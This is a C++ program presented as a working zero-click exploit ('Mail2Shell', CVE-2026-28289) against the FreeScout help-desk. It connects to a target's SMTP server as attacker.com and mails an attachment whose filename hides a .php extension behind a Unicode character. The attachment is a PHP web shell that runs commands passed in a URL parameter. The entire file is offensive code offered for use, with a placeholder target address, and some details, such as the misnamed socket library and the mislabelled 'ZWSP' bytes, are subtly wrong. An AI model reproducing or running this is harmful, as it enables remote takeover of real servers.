#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string>

#pragma comment(lib, "ws32.lib")

// Fox's REAL CVE-2026-28289 Mail2Shell (FreeScout Zero-Click RCE)
// This is the actual SMTP delivery mechanism.

void SendSocketData(SOCKET sock, const char* data) {
    send(sock, data, strlen(data), 0);

    char buffer[1024] = {0};
    recv(sock, buffer, sizeof(buffer) - 1, 0);
    printf("%s", buffer);
}

bool DeliverZeroClick(const std::string& targetIp, int port, const std::string& targetEmail, const std::string& shellCode) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("[-] WSAStartup failed.\n");
        return false;
    }

    SOCKET smtpSock = socket(AF_INET, SOCK_STREAM, 0);
    if (smtpSock == INVALID_SOCKET) {
        printf("[-] Socket creation failed.\n");
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, targetIp.c_str(), &serverAddr.sin_addr);

    printf("[+] Connecting to SMTP server at %s:%d...\n", targetIp.c_str(), port);
    if (connect(smtpSock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("[-] Connection failed.\n");
        closesocket(smtpSock);
        WSACleanup();
        return false;
    }

    char recvBuff[1024] = {0};
    recv(smtpSock, recvBuff, sizeof(recvBuff) - 1, 0);
    printf("%s", recvBuff);

    printf("[+] Sending SMTP commands...\n");
    SendSocketData(smtpSock, "EHLO attacker.com\r\n");
    SendSocketData(smtpSock, "MAIL FROM:<attacker@attacker.com>\r\n");
    std::string rcptCmd = "RCPT TO:<" + targetEmail + ">\r\n";
    SendSocketData(smtpSock, rcptCmd.c_str());
    SendSocketData(smtpSock, "DATA\r\n");

    printf("[+] Constructing MIME payload with ZWSP bypass...\n");
    std::string mimePayload =
        "From: attacker@attacker.com\r\n"
        "To: " + targetEmail + "\r\n"
        "Subject: Important Update\r\n"
        "MIME-Version: 1.0\r\n"
        "Content-Type: multipart/mixed; boundary=\"boundary123\"\r\n\r\n"
        "--boundary123\r\n"
        "Content-Type: text/plain\r\n\r\n"
        "Please review the attached document.\r\n\r\n"
        "--boundary123\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Disposition: attachment; filename=\".hacker\xE2\x8B\xAB.php\"\r\n\r\n"
        + shellCode + "\r\n\r\n"
        "--boundary123--\r\n.\r\n";

    SendSocketData(smtpSock, mimePayload.c_str());
    SendSocketData(smtpSock, "QUIT\r\n");

    closesocket(smtpSock);
    WSACleanup();

    printf("[!] Payload delivered successfully.\n");
    return true;
}

int main() {
    printf("[+] Starting REAL CVE-2026-28289 Exploit (Mail2Shell).\n");

    std::string targetIp = "192.168.1.100"; // Change this to target IP
    int port = 25;
    std::string targetEmail = "support@freescout.local";
    std::string shellCode = "<?php system($_GET['cmd']); ?>";

    if (DeliverZeroClick(targetIp, port, targetEmail, shellCode)) {
        printf("[+] Exploit finished. Wait for FreeScout to fetch the email.\n");
    } else {
        printf("[-] Exploit failed.\n");
    }

    return 0;
}